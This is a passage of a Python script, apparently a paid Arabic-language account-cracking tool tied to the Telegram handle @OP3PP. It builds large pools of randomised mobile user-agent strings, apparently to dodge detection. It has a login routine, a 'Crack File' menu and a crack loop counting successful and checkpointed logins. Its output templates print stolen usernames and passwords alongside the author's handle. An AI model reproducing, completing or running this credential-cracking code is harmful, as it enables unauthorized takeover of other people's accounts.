...
if x.strftime('%x') > g.strftime('%x'):
    print('\n\n')
    print('     تم توقيف اداة راسل المطور لتفعيله المدفوع @OP3PP')
    print('\n\n')
    print(x)
    sys.exit(0)
if x.strftime('%x') == g.strftime('%x'):
    ...
    if x.strftime('%X') > g.strftime('%X'):
        print('\n\n')
        print('     انتهى وقت تفعيل الاداة للاشتراك المدفوع راسل المطور @OP3PP')
        print('\n\n')
        print(x)
        sys.exit(0)
    else:
...
pretty.install()
CON=sol() 
user_agent=['Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/528.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36']
...
for xd in range(10000):
	...
	k='Mozilla/5.0 (Symbian/3; Series60/'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='MQQBrowser/6.2 TBS/045713 Mobile Safari/537.36 MMWEBID/4383 MicroMessenger/8.0.10.1960(0x28000A3D) Process/tools WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64'
	b=random.choice(['2','3','4','5','5.2','6','6.0.1','7','8','9','10','11','11','11.0.1','12','13'])
	c=random.choice(['OPPO A57 Build/MMB29M; wv'])
	d='MQQBrowser/6.2 TBS/045713 Mobile Safari/537.36 MMWEBID/4383 MicroMessenger/8.0.10.1960(0x28000A3D) Process/tools WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64'
	e=random.randrange(80,106)
	f='0'
	g=random.randrange(3904,5000)
	h=random.randrange(40,100)
	i='Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5'
	uaku2=f'{aa} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uaku2)
for x in range(1000):
	a='Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5'
	...
	i='Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5'
...
def login():
	try:
		...
		try:
			...
			print(' %s# NO INTERNET CONNECTION ! '%(M))
			exit()
	except IOError:
		Ra_2005_log()
...
def Ra_2005_log():
	try:
		...
		xox('\n [+] DONE LOGIN ✓ :)');time.sleep(2)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		print('%s# [ + ] FAILD LOGIN '%(M))
		exit()
def menu(my_name,my_id):
	...
	os.system('clear')
	print(b+'═════════════════════════════════════════════')
	print(X+' [ 1 ] Crack File : مــن مــلــف  ')	
	print(b+'═════════════════════════════════════════════')
...
def passwrd():	
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}[=]{k} الئ القاء تجربة ممتعة {x} <> ')
		time.sleep(2)
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s 3BS %s/%s » [OK ✓ ] %s » [CP ✗] %s » %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
عبس جابلك حساب سكيور لا تضوج هسه يجيك شغال
⋘─────━@op3pp━─────⋙
@op3pp ➩معرفي 	
					'''
...
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
عبس جابلك حساب شغال دز صور صيد لـ عبس
⋘─────━@مدفوع━─────⋙
@op3pp- ➩معرفي 		
					'''
